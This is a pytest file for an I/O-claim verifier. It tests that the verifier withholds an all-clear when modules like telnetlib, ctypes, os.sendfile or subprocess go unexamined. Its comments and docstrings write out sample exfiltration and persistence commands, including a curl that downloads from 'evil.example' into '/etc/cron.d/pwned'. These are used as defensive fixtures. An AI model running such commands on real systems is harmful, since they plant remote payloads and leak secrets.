# SPDX-License-Identifier: AGPL-3.0-or-later
"""A boundary claim may be confirmed only over modules whose I/O was ENUMERATED.

WHAT WAS BROKEN (INV-buzab P0, INV-zubuh P1). Reproduced first-hand on the
shipped CLI at dev ``3cb415eb58`` — no overlay, no flags, no third-party
dependency, no catalogue edit — with two controls firing correctly in the same
session:

    fixture (python, ~10 lines)                     claim            verdict   rc
    ----------------------------------------------  ---------------  --------  --
    telnetlib.Telnet(host,23); conn.write(secret)   net_send absent  confirmed  0
    ssl.create_default_context(); sock.sendall(s)   net_send absent  confirmed  0
    ctypes.CDLL("libc.so.6").system(b"curl ...")    net_send absent  confirmed  0
    os.sendfile(sock_fd, file_fd, 0, 4096)          net_send absent  confirmed  0
    os.open(p, O_WRONLY|O_CREAT); os.write(fd, d)   fs_write absent  confirmed  0
    ---- controls ----
    requests.post(url, data=secret)                 net_send absent  inconclus  2
    os.makedirs(p); os.remove(p)                    fs_write absent  violated   1

The two controls are what make the first five a defect rather than an analyzer
that cannot see: the run WORKS. It classifies ``os.makedirs`` and refuses to
adjudicate ``requests``. It then reports silence as safety for a program that
opens a telnet session and writes a secret into it.

TWO ARMS OF ONE PREDICATE, and they fail for different reasons.

*Arm 1 — NAME RECOGNITION (telnetlib, ssl, ctypes).* The gate permitted a module
on ``IoBoundaryCatalog.is_stdlib_module``, membership in a 300-entry list
generated mechanically from ``sys.stdlib_module_names``, while its own docstring
called that branch "an examined negative". Nothing was examined: 283 of those 300
modules carry no catalogue row at all. ``is_stdlib_module`` answers "do I
recognise this name"; the gate needed "have I enumerated this module's I/O", and
the predicate that means THAT — ``is_stdlib_module_complete``, designed
2026-05-13 and documented in exactly the right terms — was never called by it.

*Arm 2 — ROW PRESENCE (os.open, os.write, os.sendfile).* The gate also permitted
a module when the catalogue declared ANY primitive for it. ``os`` carries 40
rows, so ``os`` counted as covered — for every boundary kind at once, including
the 30-odd I/O functions the catalogue never enumerated. ``os.open`` /
``os.write`` / ``os.sendfile`` are not among the rows, so the writes and the
network send were silently unclassified and the absence was reported as proof.
Presence was doing the work that completeness should do.

WHY THE FIX CANNOT SUPPRESS A REAL DETECTION, which is what makes the strict
direction affordable: ``verify_claim`` returns ``violated`` at
verify_claims.py:1057 — OUTSIDE the ``coverage.complete`` branch. Coverage gates
only the all-clear. The ``os.makedirs`` control above stays ``violated`` under
any tightening; only "I found nothing" becomes conditional on having looked.

THESE TESTS USE THE REAL SHIPPED CATALOGUE AND REAL EDGE SHAPES, on purpose.
A hand-written ``IoBoundaryCatalog`` fixture is how this defect survived: the
sibling test file's ``_py_catalog`` declares ``stdlib_modules={... "math"}`` and
no completeness data, so its
``test_known_stdlib_module_is_adjudicable_even_with_no_primitive`` asserts the
broken doctrine verbatim ("The catalogue still KNOWS it, so a call into it is an
examined negative") and passes forever. Every edge below was captured from an
actual ``hypergumbo survey`` run over the fixture named in its comment, not
composed by hand, so a change in how the analyzer spells a dst breaks these
tests instead of leaving them green against a shape production never emits.
"""

from __future__ import annotations

from pathlib import Path

import pytest

import hypergumbo_core.io_boundary as io_boundary
import hypergumbo_core.verify_claims as verify_claims
from hypergumbo_core.io_boundary import (
    CATALOG_BOUNDARY_TYPES,
    KNOWN_IO_BOUNDARIES,
    OPAQUE_BOUNDARIES,
    PRODUCER_OPAQUE_BOUNDARIES,
    load_catalog,
)
from hypergumbo_core.verify_claims import compute_boundary_coverage


def _shipped_languages() -> list[str]:
    """Every catalogue actually on disk, read at call time.

    A hardcoded list would silently exempt the next language someone adds,
    which is the whole failure mode the parity test exists to catch.
    """
    catalog_dir = Path(io_boundary.__file__).parent / "io_primitives"
    return sorted(p.stem for p in catalog_dir.glob("*.yaml"))

#: Captured verbatim from ``hypergumbo survey`` over a fixture whose only
#: network egress is ``telnetlib.Telnet(...).write(secret)``.
TELNET_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:telnetlib:0-0:telnetlib:external_symbol", "type": "imports"},
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:os:0-0:os:external_symbol", "type": "imports"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:telnetlib:0-0:Telnet:external_symbol", "type": "instantiates"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:external:0-0:write:external_symbol", "type": "calls"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:external:0-0:close:external_symbol", "type": "calls"},
    {"src": "python:main.py:11-12:main:function",
     "dst": "python:os:0-0:os.environ:external_symbol", "type": "module_attr_ref"},
]

#: ``ssl.create_default_context()`` then ``sock.sendall(secret)``.
SSL_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:ssl:0-0:ssl:external_symbol", "type": "imports"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:ssl:0-0:create_default_context:external_symbol",
     "type": "calls"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:ssl:0-0:SSLSocket:external_symbol", "type": "instantiates"},
    {"src": "python:main.py:5-8:exfiltrate:function",
     "dst": "python:external:0-0:sendall:external_symbol", "type": "calls"},
]

#: ``ctypes.CDLL("libc.so.6").system(b"curl -d <secret> http://...")``.
CTYPES_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:ctypes:0-0:ctypes:external_symbol", "type": "imports"},
    {"src": "python:main.py:5-7:exfiltrate:function",
     "dst": "python:ctypes:0-0:CDLL:external_symbol", "type": "instantiates"},
    {"src": "python:main.py:5-7:exfiltrate:function",
     "dst": "python:external:0-0:system:external_symbol", "type": "calls"},
]

#: ``os.sendfile(sock_fd, file_fd, 0, 4096)`` — a network send through a module
#: the catalogue DOES carry rows for, none of which is ``sendfile``.
OS_SENDFILE_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:os:0-0:os:external_symbol", "type": "imports"},
    {"src": "python:main.py:4-5:leak:function",
     "dst": "python:os:0-0:sendfile:external_symbol", "type": "calls"},
]

#: ``os.open(p, O_WRONLY|O_CREAT)`` then ``os.write(fd, data)`` — same shape on
#: the filesystem side. ``os.open`` and ``os.write`` are uncatalogued while
#: ``os.makedirs`` / ``os.remove`` are not.
OS_WRITE_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:os:0-0:os:external_symbol", "type": "imports"},
    {"src": "python:main.py:4-7:persist:function",
     "dst": "python:os:0-0:open:external_symbol", "type": "calls"},
    {"src": "python:main.py:4-7:persist:function",
     "dst": "python:os:0-0:write:external_symbol", "type": "calls"},
    {"src": "python:main.py:4-7:persist:function",
     "dst": "python:os:0-0:close:external_symbol", "type": "calls"},
    {"src": "python:main.py:4-7:persist:function",
     "dst": "python:os:0-0:os.O_WRONLY:external_symbol", "type": "module_attr_ref"},
]

#: The negative control that already worked. If this one ever stops blocking,
#: the fix went the wrong way and every assertion above passes vacuously.
REQUESTS_EDGES = [
    {"src": "python:main.py:1-1:file:file",
     "dst": "python:requests:0-0:requests:external_symbol", "type": "imports"},
    {"src": "python:main.py:5-6:exfiltrate:function",
     "dst": "python:requests:0-0:post:external_symbol", "type": "calls"},
]


def _coverage(edges: list[dict]):
    """Run the real gate over the real shipped python catalogue."""
    return compute_boundary_coverage(
        edges, {"python"}, {"python": load_catalog("python")},
    )


class TestNameRecognitionIsNotExamination:
    """Arm 1 — a module the interpreter calls stdlib is not thereby examined."""

    @pytest.mark.parametrize(
        ("module", "edges"),
        [("telnetlib", TELNET_EDGES), ("ssl", SSL_EDGES), ("ctypes", CTYPES_EDGES)],
    )
    def test_rowless_stdlib_module_cannot_support_a_clean_verdict(
        self, module: str, edges: list[dict],
    ) -> None:
        coverage = _coverage(edges)
        assert coverage.complete is False, (
            f"{module} carries no catalogue row and no completeness flag, so "
            f"'no chains found' means 'none I could see'. Confirming here is "
            f"the INV-buzab false all-clear."
        )
        assert module in coverage.reason, (
            f"the reason must NAME {module} so the gap is actionable; got: "
            f"{coverage.reason!r}"
        )


class TestRowPresenceIsNotEnumeration:
    """Arm 2 — one catalogued primitive does not cover a module's whole surface."""

    @pytest.mark.parametrize(
        ("what", "edges"),
        [("os.sendfile", OS_SENDFILE_EDGES), ("os.open/os.write", OS_WRITE_EDGES)],
    )
    def test_partially_catalogued_module_cannot_support_a_clean_verdict(
        self, what: str, edges: list[dict],
    ) -> None:
        coverage = _coverage(edges)
        assert coverage.complete is False, (
            f"{what} is real I/O through a module the catalogue only partially "
            f"enumerates. Presence of SOME os rows must not vouch for the rest "
            f"(INV-zubuh)."
        )
        assert "os" in coverage.reason


class TestTheControlsThatMakeTheAboveMeanSomething:
    """Both directions. A gate that blocks everything proves nothing."""

    def test_the_third_party_module_still_blocks(self) -> None:
        """``requests`` was already correct. It must stay correct."""
        coverage = _coverage(REQUESTS_EDGES)
        assert coverage.complete is False
        assert "requests" in coverage.reason

    def test_an_enumerated_module_still_supports_confirmation(self) -> None:
        """THE REACHABILITY GUARD, on the real catalogue.

        ``math`` is the one module python.yaml flags ``completeness: complete``,
        backed by a dated per-module audit. A program whose only external call
        is into an enumerated module has genuinely been examined, and a verdict
        vocabulary where nothing is ever confirmable is worthless in the other
        direction — the blanket-downgrade failure ``cli.py`` records happening
        once already.
        """
        coverage = _coverage([
            {"src": "python:main.py:1-1:file:file",
             "dst": "python:math:0-0:math:external_symbol", "type": "imports"},
            {"src": "python:main.py:3-4:area:function",
             "dst": "python:math:0-0:sqrt:external_symbol", "type": "calls"},
        ])
        assert coverage.complete is True, coverage.reason

    def test_an_unresolved_first_party_callee_still_does_not_block(self) -> None:
        """The RETAINED branch, exercised where it actually lives.

        An earlier version of this test used a dst ending in ``:function``,
        which the gate discards at the terminal-slot filter before the
        first-party branch is ever consulted — so it passed without touching
        the thing it named. The dst has to carry an EXTERNAL terminal slot
        (``unresolved``) while naming a module whose source this run read, which
        is the real shape: an in-repo callee the resolver could not bind.
        """
        edges = [
            # app/config.py was analysed — it appears as a call SOURCE.
            {"src": "python:app/config.py:3-9:load:function",
             "dst": "python:math:0-0:sqrt:external_symbol", "type": "calls"},
            # ...and an unresolved call INTO it must not be blamed.
            {"src": "python:app.py:1-5:handler:function",
             "dst": "python:app.config:0-0:load:unresolved", "type": "calls"},
        ]
        coverage = _coverage(edges)
        assert coverage.complete is True, coverage.reason
        # NON-VACUITY: the same shape with a genuinely external module blocks,
        # so the branch above is doing work rather than the filter above it.
        blocked = _coverage(edges + [
            {"src": "python:app.py:1-5:handler:function",
             "dst": "python:requests:0-0:get:external_symbol", "type": "calls"},
        ])
        assert blocked.complete is False
        assert "requests" in blocked.reason and "app.config" not in blocked.reason


class TestTheMatchingRuleItself:
    """The predicate's own edges, stated as cases rather than left to inference.

    Kept separate from the gate tests above because the anchoring rule is the
    entire safety argument and deserves to fail loudly on its own terms: a
    permissive change here would show up as one broken case, not as a subtly
    different verdict three call levels away.
    """

    @staticmethod
    def _cat(**kw):
        from hypergumbo_core.io_boundary import IoBoundaryCatalog
        return IoBoundaryCatalog(language="python", primitives=[], **kw)

    @pytest.mark.parametrize(
        ("declared", "queried", "expected", "why"),
        [
            ({"math": "d"}, "math", True, "exact — the only True case"),
            ({"urllib": "d"}, "urllib.request", False,
             "urllib is a NAMESPACE package: urllib.request opens URLs and "
             "urllib.parse does pure string work. Auditing one says nothing "
             "about the other, so a declaration must not descend."),
            ({"math": "d"}, "math/rand", False,
             "Go's separator is not containment — math/rand is an independent "
             "package, not part of math"),
            ({"os": "d"}, "os/exec", False,
             "and the Go case that would have mattered most: os/exec is the "
             "subprocess surface, vouched for by an audit of os"),
            ({"std": "d"}, "std::fs", False,
             "Rust namespaces with ::, which no separator list covered — the "
             "draft rule was too loose for Go and inert here at once"),
            ({"pathlib": "d"}, "pathlib2", False,
             "a longer NAME is a different module"),
            ({"pathlib": "d"}, "vendor.pathlib", False,
             "SUFFIX match is what the tagger does; this gate must not"),
            ({"urllib.request": "d"}, "urllib", False,
             "auditing a submodule does not vouch for its parent"),
            ({}, "math", False, "nothing declared means nothing enumerated"),
            ({"math": "d"}, "", False,
             "no module to adjudicate — the placeholder residual"),
        ],
    )
    def test_only_an_exact_declaration_counts(
        self, declared: dict, queried: str, expected: bool, why: str,
    ) -> None:
        catalog = self._cat(stdlib_module_completeness=declared)
        assert catalog.module_io_is_enumerated(queried) is expected, why


class TestOnePredicateWithNoSecondHome:
    """Every consumer of the closed-world claim routes through one predicate.

    The plan governing this work makes it binding: a bucket-A fix "lands as ONE
    predicate in ONE place, consumed by every caller, plus a parity test that
    enumerates the callers". Two predicates over ``stdlib_module_completeness``
    existed briefly — an exact-match ``is_stdlib_module_complete`` read by the
    F3 Filter 2 ``external_potential`` skip, and the prefix-anchored one read by
    the coverage gate. They ask the identical question, so the difference was
    drift waiting to happen rather than a distinction.
    """

    def test_exactly_one_catalogue_method_reads_the_completeness_field(
        self,
    ) -> None:
        """Enumerated from the live class, not from a list someone maintains.

        Any method of ``IoBoundaryCatalog`` whose own source touches
        ``self.stdlib_module_completeness`` is answering the closed-world
        question. There must be one, and ``merge`` — which COPIES the field
        rather than interpreting it — is the only permitted exception.
        """
        import inspect

        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        readers = set()
        for name, member in inspect.getmembers(
            IoBoundaryCatalog, predicate=inspect.isfunction,
        ):
            try:
                src = inspect.getsource(member)
            except (OSError, TypeError):  # pragma: no cover - stdlib slots
                continue
            if "self.stdlib_module_completeness" in src:
                readers.add(name)
        assert readers, "assertion is vacuous — nothing reads the field at all"
        assert readers == {"module_io_is_enumerated", "merge"}, (
            f"a second home for the closed-world claim appeared: {sorted(readers)}. "
            f"Two predicates over one fact drift; fold it into "
            f"module_io_is_enumerated."
        )

    def test_both_consumers_route_through_it_in_the_source(self) -> None:
        """The callers, enumerated — the predicate agreeing with itself is not
        the property under test, the two call sites CONSULTING it is.

        A previous version of this test called the predicate twice and asserted
        it equalled itself, which would have passed with either call site still
        holding its own copy of the rule. This reads the two production modules
        and asserts each names the predicate.
        """
        import inspect

        # Read each CALLER's own body, so a reformat cannot silently pass and a
        # caller that grew its own copy of either rule fails.
        bodies = {
            "Filter 2": inspect.getsource(io_boundary._compute_external_potential),
            "tagger": inspect.getsource(io_boundary.tag_io_boundaries),
            "coverage gate": inspect.getsource(
                verify_claims._uncatalogued_external_modules,
            ),
        }
        assert "module_io_is_enumerated" in bodies["Filter 2"], (
            "the external_potential closed-world skip no longer consults the "
            "shared enumeration predicate"
        )
        assert "module_io_is_enumerated" in bodies["coverage gate"], (
            "the coverage gate no longer consults the shared enumeration "
            "predicate"
        )
        for who in ("tagger", "coverage gate"):
            assert "classify_call" in bodies[who], (
                f"{who} no longer asks the shared classification question; a "
                f"private copy is how the gate came to call a site unexamined "
                f"that the tagger had just tagged"
            )
        # ...and neither caller kept a private lookup alongside it.
        for who in ("tagger", "coverage gate"):
            assert "lookup_with_module" not in bodies[who], (
                f"{who} calls the catalogue lookup directly again"
            )

    def test_the_gate_never_counts_an_edge_type_the_tagger_cannot_tag(
        self,
    ) -> None:
        """ONE PREDICATE IS NOT ENOUGH — IT MUST RUN OVER ONE POPULATION.

        The two tests above pin that the gate and the tagger consult a single
        classification PREDICATE. Neither pins that they run it over the same
        edge POPULATION, and that gap shipped as INV-motos:
        ``_CALL_SITE_EDGE_TYPES`` carried ``instantiates`` — its own comment
        justifying it, "a constructor is a genuine classification
        opportunity" — while ``tag_io_boundaries`` did not. So a
        constructor-shaped primitive was EXAMINED by the gate and untaggable
        by the tagger, "no chains found" became ``confirmed``, and
        ``subprocess.Popen([...])`` passed a "never shells out" claim at rc 0
        while ``subprocess.run([...])`` correctly returned ``violated``.

        ONLY ONE DIRECTION IS ASSERTED, and the asymmetry is the point. The
        tagger may legitimately be BROADER — it carries ``imports`` and the
        FFI family, which the gate documents excluding because an import
        performs no I/O — and that direction is safe: an edge the tagger tags
        but the gate ignores can only downgrade ``confirmed`` to
        ``inconclusive``. The reverse manufactures a false all-clear, so the
        reverse is what this test forbids.
        """
        import inspect

        default = inspect.signature(
            io_boundary.tag_io_boundaries,
        ).parameters["call_types"].default
        assert default, (
            "assertion is vacuous — the tagger no longer has a default "
            "call_types set to compare against"
        )
        assert verify_claims._CALL_SITE_EDGE_TYPES, (
            "assertion is vacuous — the gate counts no edge types at all"
        )
        counted_but_untaggable = (
            set(verify_claims._CALL_SITE_EDGE_TYPES) - set(default)
        )
        assert not counted_but_untaggable, (
            f"the coverage gate counts {sorted(counted_but_untaggable)} as a "
            f"call site the catalogue could have classified, but "
            f"tag_io_boundaries will never tag those edges. Every primitive "
            f"reached that way is EXAMINED with no chain to show for it, "
            f"which is a silent `confirmed` (INV-motos). Add the type to "
            f"tag_io_boundaries' call_types, or stop counting it in the gate."
        )


class TestEveryShippedCatalogueIsHeldToTheSameRule:
    """PARITY OVER THE LIVE REGISTRY, not over a list someone remembered to edit.

    The defect was language-shaped by accident, and that is the part worth
    guarding. ``stdlib_modules`` is populated for python (300 entries, from
    ``sys.stdlib_module_names``) and EMPTY for the other 13 — because it was
    added for supply-chain ecosystem stamping, not for claim verification. So
    the same predicate ran permissive on python and strict everywhere else, and
    which one you got depended on whether an unrelated feature had happened to
    your language. Measured both ends first-hand: a python program exfiltrating
    through ``telnetlib`` confirmed, while a Go program with no filesystem I/O
    at all returned inconclusive naming ``fmt``, ``sort`` and ``strings``.
    """

    @pytest.mark.parametrize("language", _shipped_languages())
    def test_row_presence_alone_never_makes_a_module_adjudicable(
        self, language: str,
    ) -> None:
        """For every catalogued module in every shipped language: having rows
        must not, by itself, answer the enumeration question. Any language that
        regains a presence-shaped shortcut fails here rather than in the field.
        """
        catalog = load_catalog(language)
        assert catalog.primitives, f"{language}.yaml is empty — assertion vacuous"
        leaked = sorted({
            p.module for p in catalog.primitives
            if p.module
            and not catalog.module_io_is_enumerated(p.module)
            and _permits(catalog, p.module)
        })
        assert not leaked, (
            f"{language}: {len(leaked)} module(s) would support a clean verdict "
            f"without an enumeration record, e.g. {leaked[:5]}"
        )

    @pytest.mark.parametrize("language", _shipped_languages())
    def test_the_enumeration_record_is_the_only_thing_that_permits(
        self, language: str,
    ) -> None:
        """The converse, so the test above cannot pass by the predicate having
        become unconditionally False. Whatever a catalogue HAS declared
        enumerated must still permit — today that is ``math`` on python and
        nothing at all on the other 13, which is itself the honest starting
        state for a catalogue nobody has audited."""
        catalog = load_catalog(language)
        for module in catalog.stdlib_module_completeness:
            assert _permits(catalog, module), (
                f"{language}: {module} carries a dated closed-world audit and "
                f"still does not support a clean verdict"
            )


#: Captured verbatim from ``hypergumbo survey`` over a 6-line fixture whose
#: only statement is
#: ``subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])``.
#: The ``call_construct: method`` is production's own spelling for an attribute
#: call and is preserved rather than normalised — the gate reads it.
SUBPROCESS_CURL_EDGES = [
    {"src": "python:run.py:1-1:file:file",
     "dst": "python:subprocess:0-0:subprocess:external_symbol", "type": "imports"},
    {"src": "python:run.py:4-5:grab:function",
     "dst": "python:subprocess:0-0:run:external_symbol", "type": "calls",
     "meta": {"call_construct": "method"}},
]

#: THE DISCRIMINATOR. A call the catalogue classifies into a NON-opaque
#: boundary, over a module that is NOT enumerated — so the only thing that can
#: be permitting it is the classification itself. ``os`` carries no
#: completeness record (``module_io_is_enumerated('os')`` is False), yet
#: ``os.makedirs`` is a catalogued ``fs_write`` row.
OS_MAKEDIRS_EDGES = [
    {"src": "python:main.py:4-5:persist:function",
     "dst": "python:os:0-0:makedirs:external_symbol", "type": "calls"},
]


class TestAnOpaqueCrossingIsNotAnExaminedNegative:
    """INV-gahuz — classifying a call as ``subprocess`` records that the
    analysis CANNOT SEE PAST it, and that must not be consumed as "I looked".

    THE RESIDUAL ONE LEVEL BELOW INV-buzab. The two arms above were about a
    module the catalogue had never enumerated. Here the call site IS matched,
    by a real row, and the row is CORRECT: ``subprocess.run`` really is a
    subprocess primitive. What is wrong is the INFERENCE from "a row matched"
    to "this boundary was examined". For every other boundary that inference
    holds, because a matched row implies a known and complete surface —
    ``os.makedirs`` classified ``fs_write`` genuinely IS an examined negative
    for a network claim. ``subprocess`` is the one boundary in
    ``CATALOG_BOUNDARY_TYPES`` that asserts the opposite.

    MEASURED ON THE SHIPPED CLI at dev ``4b2e745d3d``, both controls firing in
    the same session:

        fixture (python, 6 lines)                       claim            verdict  rc
        ----------------------------------------------  ---------------  -------  --
        subprocess.run(["curl","-o",FILE,URL])          fs_write absent  confirm   0
        subprocess.run(["curl","-o",FILE,URL])          net_send absent  confirm   0
        ---- controls ----
        open("/etc/cron.d/pwned","w").write("x")        fs_write absent  violated  1
        socket.connect(...); socket.send(secret)        net_send absent  violated  1

    The program downloads a remote payload into a root cron directory and
    confirms BOTH that it never writes to the filesystem AND that it never
    sends over the network. Two false all-clears from one call.
    """

    def test_an_opaque_launch_cannot_support_a_clean_verdict(self) -> None:
        coverage = _coverage(SUBPROCESS_CURL_EDGES)
        assert coverage.complete is False, (
            "a subprocess launch is exactly the case where the launched "
            "program's I/O is absent from the edge set, so 'no chains found' "
            "means 'none I could see' (INV-gahuz)"
        )
        assert "subprocess" in coverage.reason, (
            f"the reason must NAME the opaque crossing so the gap is "
            f"actionable; got: {coverage.reason!r}"
        )

    def test_the_reason_does_not_claim_the_call_was_unclassifiable(self) -> None:
        """WORDING IS LOAD-BEARING HERE, and the obvious implementation gets it
        wrong. Routing opaque crossings into the existing uncatalogued-module
        list would print "the I/O catalog could not classify (subprocess)",
        which is FALSE — it classified it exactly right. The blocker is
        opacity, not a catalogue gap, and a reader who patches the wrong one
        learns nothing. The same failure already shipped once as a doubled
        clause, caught only by reading rendered output.
        """
        coverage = _coverage(SUBPROCESS_CURL_EDGES)
        # NON-VACUITY: before the fix the reason is '' and every substring
        # assertion below passes for the wrong reason.
        assert coverage.reason, "a blocked verdict must state its cause"
        assert "could not classify" not in coverage.reason, (
            f"the catalogue DID classify subprocess.run; the reason must say "
            f"the launch is opaque, not that the row is missing. Got: "
            f"{coverage.reason!r}"
        )

    def test_a_classified_non_opaque_call_still_supports_confirmation(self) -> None:
        """THE DISCRIMINATOR, and it is the whole precision argument.

        Both this fixture and the one above are ``complete=True`` before the
        fix, and both are single classified calls over a module carrying NO
        enumeration record. A fix that merely stopped trusting
        ``classify_call`` would turn BOTH False and this test is what catches
        it — the distinction has to be the BOUNDARY, not the fact of matching.
        """
        assert load_catalog("python").module_io_is_enumerated("os") is False, (
            "precondition: if os ever gains a completeness record this test "
            "starts passing through the enumeration branch instead and stops "
            "discriminating"
        )
        coverage = _coverage(OS_MAKEDIRS_EDGES)
        assert coverage.complete is True, coverage.reason

    def test_the_opaque_set_is_declarable_by_a_catalogue(self) -> None:
        """A PREDICATE IS INERT UNTIL ITS CALL SITES CAN REACH IT.

        ``_parse_catalog`` iterates exactly ``CATALOG_BOUNDARY_TYPES``, so a
        boundary outside that tuple can never appear on a catalogued primitive
        and listing it as opaque would be a gate nothing can trip —
        ``command_launch`` and ``external_potential`` are exactly such names
        (synthesised, never declared). This is the cheap structural check that
        the set stays wired to something real.
        """
        assert OPAQUE_BOUNDARIES <= set(CATALOG_BOUNDARY_TYPES), (
            f"opaque boundaries no catalogue can declare are inert: "
            f"{sorted(OPAQUE_BOUNDARIES - set(CATALOG_BOUNDARY_TYPES))}"
        )

    @pytest.mark.parametrize("language", _shipped_languages())
    def test_every_language_declaring_an_opaque_primitive_is_gated(
        self, language: str,
    ) -> None:
        """PARITY OVER THE REGISTRY, because a fix verified on Python is not
        verified for Go.

        13 of the 15 shipped catalogues declare ``subprocess`` rows. Each one
        is a language whose repos can hand control to an unseen program, and
        each must block a clean verdict on its own edges — not on Python's.
        The next catalogue to add a subprocess row is covered by this the day
        it lands.

        TWO CATALOGUES SKIP, for different reasons, and neither is a gap:

        * **erlang** declares no subprocess rows at all.
        * **bash** (INV-vavup) declares only redirection — the shell's OWN
          reads and writes. Its opacity is real but arrives from the other
          direction: the analyzer PRODUCER-STAMPS ``command_launch`` on every
          external-command edge (INV-larol), and that lives in
          ``PRODUCER_OPAQUE_BOUNDARIES``, not in the catalogue-declared
          ``OPAQUE_BOUNDARIES`` this test enumerates. Adding a ``subprocess``
          row to ``bash.yaml`` to make this parameter run would be
          precisely the mis-attribution ADR-0016 forbids — it would credit
          the shell with the launched program's I/O. bash's launch gating is
          covered by the producer-stamp tests instead.
        """
        catalog = load_catalog(language)
        opaque_rows = [p for p in catalog.primitives
                       if p.boundary in OPAQUE_BOUNDARIES]
        if not opaque_rows:
            pytest.skip(f"{language} declares no opaque primitive")
        row = opaque_rows[0]
        coverage = compute_boundary_coverage(
            [{"src": f"{language}:app.src:1-5:handler:function",
              "dst": f"{language}:{row.module}:0-0:{row.name}:external_symbol",
              "type": "calls",
              "meta": {"call_construct": row.kind}}],
            {language},
            {language: catalog},
        )
        assert coverage.complete is False, (
            f"{language}: a call to the catalogued opaque primitive "
            f"{row.module}.{row.name} still supports a clean verdict"
        )


def _permits(catalog, module: str) -> bool:
    """Whether the real gate would let ``module`` through, via the real gate.

    Goes through :func:`compute_boundary_coverage` rather than calling the
    predicate directly: the predicate being right is not the property under
    test, the GATE consulting it is.
    """
    coverage = compute_boundary_coverage(
        [{"src": f"{catalog.language}:app.src:1-5:handler:function",
          "dst": f"{catalog.language}:{module}:0-0:probe:external_symbol",
          "type": "calls"}],
        {catalog.language},
        {catalog.language: catalog},
    )
    return coverage.complete


#: A two-line shell script whose only external command is
#: ``curl -o /etc/cron.d/pwned "https://evil.example/payload"``. Captured from an
#: actual ``analyze_bash`` run over that fixture — every field the gate reads is
#: verbatim (content-hash ids and the run uuid elided as noise). The terminal
#: slot is ``unresolved`` rather than ``external_symbol`` because the bash
#: producer emits an unresolved external-command edge and stamps the boundary
#: itself; both slots are in ``_EXTERNAL_DST_TERMINAL_SLOTS``.
BASH_CURL_LAUNCH_EDGES = [
    {"src": "bash:deploy.sh:1-1:file:file",
     "dst": "bash:curl:0-0:curl:unresolved",
     "type": "calls",
     "is_resolved": False,
     "dst_ref": {"lang": "bash", "module_path": "curl", "name": "curl"},
     "meta": {"io_boundary": "command_launch", "io_primitive": "curl",
              "call_construct": "function"}},
]

#: The six lines this tree has three times proposed adding as
#: ``io_primitives/bash.yaml`` (verify_claims.py's own "why the catalogue is the
#: follow-up" comment, WI-sofaf disposition 2, and a session handoff note). The
#: row is CORRECT — curl really does send data to a remote host — and that is
#: precisely the point: a right row buys a wrong verdict.
_BASH_NET_SEND_ONLY = """\
language: bash
status: in_progress

net_send:
  - module: curl
    functions: [curl]
"""


def _bash_catalog(tmp_path: Path, text: str):
    """Parse a bash catalogue through PRODUCTION's loader.

    Hand-constructing an ``IoBoundaryCatalog`` is how the defect this module is
    named for survived (see the module docstring), so the YAML goes through
    ``from_yaml``. It has to be written to disk rather than loaded from the
    shipped tree because there IS no shipped ``bash.yaml`` — ADR-0016:96 rules
    one out, and this test exists to keep that ruling from being the only thing
    standing between the tree and a false confirm.
    """
    path = tmp_path / "bash.yaml"
    path.write_text(text, encoding="utf-8")
    return io_boundary.IoBoundaryCatalog.from_yaml(path)


class TestAProducerStampedLaunchIsAlsoOpaque:
    """INV-larol — opacity must not be a favour the catalogue chooses to do.

    INV-gahuz established that a ``subprocess`` row blocks confirmation of every
    other boundary, and asked the question of the CATALOGUE. One producer knows
    a call is an opaque launch with no catalogue at all: the bash analyzer
    stamps ``meta.io_boundary = "command_launch"`` (bash.py:534) because there
    is no bash catalogue to match against and, per ADR-0016:96, there is not
    going to be one. That channel was never consulted.

    NOT LIVE TODAY, AND EXACTLY ONE FILE AWAY FROM BEING SO. bash ships no
    catalogue, so ``_external_call_sites`` drops its edges on ``catalog is
    None`` and the INV-dabov language gate answers first. Three places in this
    tree recommend adding that file. Measured on the shipped CLI, fixture
    ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
    filesystem":

        io_primitives/bash.yaml            total_io  cmd_launch  fs_write claim
        ---------------------------------  --------  ----------  --------------
        (absent — today)                          0           1  inconclusive 2
        curl -> net_send                          1           0  CONFIRMED rc 0
        curl -> net_send + subprocess             1           0  inconclusive 2

    Row 2 is the defect: six correct lines turn an honest ``inconclusive`` into
    a green tick over a write into ``/etc/cron.d``. Row 3 is the control that
    makes it a defect rather than blindness — the same run, with opacity ALSO
    declared, withholds the confirmation and still reports the net_send
    violation. Detection is not what is at stake; opacity is.
    """

    def test_a_catalogued_command_does_not_strip_its_launch_opacity(
        self, tmp_path: Path,
    ) -> None:
        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
        # PRECONDITION, or this test passes through the INV-dabov language gate
        # and measures nothing: bash must be a catalogued language here.
        coverage = compute_boundary_coverage(
            BASH_CURL_LAUNCH_EDGES, {"bash"}, {"bash": catalog},
        )
        assert coverage.complete is False, (
            "a shell script launching curl hands control to a program whose "
            "file writes are not in the edge set; a net_send row classifies "
            "the call without making its OTHER I/O examined (INV-larol)"
        )
        assert coverage.reason, "a blocked verdict must state its cause"
        assert "curl" in coverage.reason, (
            f"the reason must NAME the launch so a reader can check it against "
            f"the source; got: {coverage.reason!r}"
        )

    def test_a_non_opaque_producer_stamp_still_supports_confirmation(
        self, tmp_path: Path,
    ) -> None:
        """THE DISCRIMINATOR. The gate must key on WHICH boundary was stamped,
        not on the mere presence of a producer stamp — otherwise it degenerates
        into "any prestamped edge blocks everything", which would be
        indistinguishable from the fix on the fixture above while being wrong.
        """
        edges = [dict(BASH_CURL_LAUNCH_EDGES[0],
                      meta={"io_boundary": "net_send", "io_primitive": "curl",
                            "call_construct": "function"})]
        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
        coverage = compute_boundary_coverage(edges, {"bash"}, {"bash": catalog})
